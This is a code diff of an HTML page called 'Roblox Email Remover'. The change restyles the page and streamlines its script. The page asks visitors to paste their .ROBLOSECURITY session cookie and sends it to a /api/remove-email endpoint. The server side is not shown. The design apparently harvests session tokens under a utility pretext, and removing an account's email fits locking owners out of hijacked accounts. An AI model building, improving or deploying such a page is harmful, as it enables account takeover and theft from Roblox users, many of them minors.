@@ -2,76 +2,45 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Remove Email from Roblox</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      background: #f3f4f6;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-top: 100px;
-    }
-    form {
-      background: white;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.2);
-      width: 100%;
-      max-width: 500px;
-    }
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      font-size: 16px;
-    }
-    button {
-      background: #22c55e;
-      color: white;
-      border: none;
-      cursor: pointer;
-    }
-    #response {
-      margin-top: 20px;
-      font-weight: bold;
-    }
-  </style>
+  <title>Roblox Email Remover</title>
+  <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-  <form id="removalForm">
-    <h2>Remove Email from Roblox</h2>
-    <label>.ROBLOSECURITY Cookie:</label>
-    <input type="text" id="cookieInput" placeholder="Paste your cookie..." required>
-    <button type="submit">Remove Email</button>
-    <div id="response"></div>
-  </form>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center">
+  <div class="bg-white shadow-lg rounded-lg p-8 w-full max-w-md">
+    <h1 class="text-2xl font-semibold text-center text-gray-800 mb-6">🔒 Roblox Email Remover</h1>
+
+    <form id="form" class="space-y-4">
+      <div>
+        <label for="cookie" class="block text-sm font-medium text-gray-700 mb-1">.ROBLOSECURITY Cookie</label>
+        <textarea id="cookie" rows="5" class="w-full px-3 py-2 border rounded-lg shadow-sm focus:ring focus:ring-green-200 focus:outline-none" placeholder="Paste your .ROBLOSECURITY cookie here" required></textarea>
+      </div>
+
+      <button type="submit" class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-2 px-4 rounded-lg transition duration-200">
+        🚀 Remove Email
+      </button>
+    </form>
+
+    <p id="result" class="mt-4 text-center text-sm text-gray-700 font-medium"></p>
+  </div>
 
   <script>
-    const form = document.getElementById('removalForm');
-    const responseDiv = document.getElementById('response');
+    const form = document.getElementById('form');
+    const result = document.getElementById('result');
 
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-      responseDiv.innerText = "⏳ Processing...";
+      result.textContent = '⏳ Processing...';
 
-      const cookie = document.getElementById('cookieInput').value;
+      const res = await fetch('/api/remove-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ cookie: document.getElementById('cookie').value })
+      });
 
-      try {
-        const res = await fetch('/api/remove-email', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ cookie })
-        });
-
-        const data = await res.json();
-        responseDiv.innerText = data.message || '❌ Something went wrong';
-        responseDiv.style.color = data.status === "success" ? "green" : "red";
-
-      } catch (err) {
-        responseDiv.innerText = "❌ Error sending request";
-        responseDiv.style.color = "red";
-      }
+      const data = await res.json();
+      result.textContent = data.message || (data.success ? '✅ Success' : '❌ Failed');
+      result.classList.remove('text-gray-700', 'text-green-500', 'text-red-500');
+      result.classList.add(data.success ? 'text-green-500' : 'text-red-500');
     });
   </script>
 </body>
